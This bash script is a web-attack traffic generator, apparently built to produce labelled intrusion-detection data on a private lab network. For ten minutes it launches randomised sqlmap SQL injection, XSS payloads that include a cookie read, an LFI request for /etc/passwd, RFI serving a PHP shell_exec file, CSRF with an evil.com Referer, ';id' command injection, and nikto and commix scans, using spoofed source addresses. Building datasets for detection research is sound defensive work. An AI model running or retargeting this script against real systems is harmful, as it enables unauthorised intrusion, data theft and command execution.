#!/usr/bin/env bash
#
# webbased_vm3_random.sh – Web-Based Attacks Traffic Generator
# • Duration: 600 s (10.0 min)
# • Random techniques:
#     - sqli_union (sqlmap)
#     - sqli_blind (sqlmap)
#     - xss_reflected (curl)
#     - xss_stored (curl)
#     - lfi (curl)
#     - rfi (curl + Python HTTP server)
#     - csrf (curl)
#     - cmd_injection (curl)
#     - nikto_scan (nikto)
#     - commix_cmd (commix)
# • Tools: sqlmap, curl, nikto, commix, python3, openssl, xxd
# • IP source spoofs: 192.168.56.240–254
# • Targets: 192.168.56.101, 192.168.56.102
# • Web-Based traffic only, no benign or mixed categories
#
# --- VMX: Capture all HTTP/HTTPS and Web-Based traffic to WSL ---
# sudo tcpdump -U -i enp0s3 -s0 -w - \
#   "(tcp port 80 or tcp port 443) and net 192.168.56.0/24 \
#     and not host 192.168.56.107 and not port 9999" \
#   | nc -q 0 192.168.56.107 9999
#
# Usage VM3: sudo ./webbased_vm3_random.sh

# 1) Root check (required for aliases and spoofing)
if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo for spoofing and binding to IP aliases"
  exit 1
fi

# 2) Configure tool paths
# Detect real user (not root when using sudo)
REAL_USER=${SUDO_USER:-$USER}
REAL_HOME=$(getent passwd "$REAL_USER" | cut -d: -f6)
COMMIX_PATH="$REAL_HOME/commix/commix.py"

# Alternatively, use direct absolute path:
# COMMIX_PATH="/home/villa/commix/commix.py"

# 3) Check tools
missing=()
for tool in sqlmap curl nikto python3 openssl xxd; do
  command -v "$tool" &>/dev/null || missing+=($tool)
done

# Check commix separately
if [[ ! -f "$COMMIX_PATH" ]]; then
  echo "ERROR: commix not found at: $COMMIX_PATH"
  echo "Modify the COMMIX_PATH variable in the script with the correct path"
  exit 1
fi

if (( ${#missing[@]} )); then
  echo "Missing: ${missing[*]}. Install with: sudo apt install sqlmap curl nikto python3 openssl xxd"
  exit 1
fi

# 4) Create temp dir and trap
TEMP_DIR=$(mktemp -d)
trap "kill \$HTTP_PID 2>/dev/null; rm -rf \"$TEMP_DIR\"" EXIT

# 5) Prepare RFI: shell.txt file and Python HTTP server
cat > "$TEMP_DIR/shell.txt" <<'EOF'
<?php echo shell_exec('id'); ?>
EOF
pushd "$TEMP_DIR" >/dev/null
python3 -m http.server 8000 >/dev/null 2>&1 &
HTTP_PID=$!
popd >/dev/null

# 6) General configuration
duration=600
end_time=$((SECONDS + duration))
targets=(192.168.56.101 192.168.56.102)
srcs=(192.168.56.{240..254})
iface=$(ip route | awk '/^default/ {print $5; exit}')
iface=${iface:-enp0s3}

# Ensure IP aliases on interface
for ip in "${srcs[@]}"; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

# Technique list
techs=(sqli_union sqli_blind xss_reflected xss_stored lfi rfi csrf cmd_injection nikto_scan commix_cmd)

echo "=== VM3: Random Web-Based Attacks (600s) on $iface ==="
echo "Using commix from: $COMMIX_PATH"

# 7) Main Loop
while (( SECONDS < end_time )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${srcs[RANDOM % ${#srcs[@]}]}
  timestamp=$(date +"%T")
  printf '[%s] %s -> %s (src %s)\n' "$timestamp" "$tech" "$tgt" "$src"

  case "$tech" in
    sqli_union)
      sqlmap -u "http://$tgt/?id=1" --batch --technique=U --level=2 \
             --random-agent --flush-session --mobile \
             --suffix=" UNION SELECT 1,2--" \
             > /dev/null 2>&1 &
      ;;

    sqli_blind)
      sqlmap -u "http://$tgt/?id=1" --batch --technique=B --time-sec=2 \
             --random-agent --suffix=" AND SLEEP(2)--" \
             > /dev/null 2>&1 &
      ;;

    xss_reflected)
      payload="<script>alert('XSS')</script>"
      curl -s --interface "$src" --local-port $((10000+RANDOM%5000)) \
           "http://$tgt/?q=$(echo -n "$payload" | xxd -p | tr -d '\n')" \
           > /dev/null 2>&1 &
      ;;

    xss_stored)
      payload="<script>document.cookie</script>"
      curl -s --interface "$src" -X POST "http://$tgt/comment.php" \
           -H "Content-Type: application/x-www-form-urlencoded" \
           -d "comment=$(echo -n "$payload" | xxd -p | tr -d '\n')" \
           > /dev/null 2>&1 &
      ;;

    lfi)
      curl -s --interface "$src" --local-port $((10000+RANDOM%5000)) \
           "http://$tgt/?file=../../../../etc/passwd" \
           > /dev/null 2>&1 &
      ;;

    rfi)
      curl -s --interface "$src" --local-port $((10000+RANDOM%5000)) \
           "http://$tgt/?file=http://$src:8000/shell.txt" \
           > /dev/null 2>&1 &
      ;;

    csrf)
      curl -s --interface "$src" --local-port $((10000+RANDOM%5000)) \
           -X POST "http://$tgt/transfer.php" \
           -H "Referer: http://evil.com" \
           -d "token=abcdef&amount=100" \
           > /dev/null 2>&1 &
      ;;

    cmd_injection)
      curl -s -g --interface "$src" --local-port $((10000+RANDOM%5000)) \
           "http://$tgt/?cmd=ls%3Bid%3B" \
           > /dev/null 2>&1 &
      ;;

    nikto_scan)
      nikto -h "http://$tgt" -output /dev/null > /dev/null 2>&1 &
      ;;

    commix_cmd)
      # Use Python3 to run commix
      python3 "$COMMIX_PATH" --url="http://$tgt/?id=1" --batch --random-agent \
            --timeout=10 > /dev/null 2>&1 &
      ;;
  esac

  # Concurrency control (max 12)
  while (( $(jobs -r | wc -l) > 12 )); do sleep 0.1; done

  # Random pause (0.1–0.5 s)
  pause=$(LC_NUMERIC=C awk -v min=0.1 -v max=0.5 'BEGIN{srand(); printf "%.2f", min+rand()*(max-min)}')
  sleep "$pause"
done

# Wait for all processes to finish
echo "Waiting for processes to finish..."
wait

echo "=== Web-Based Attacks finished ==="
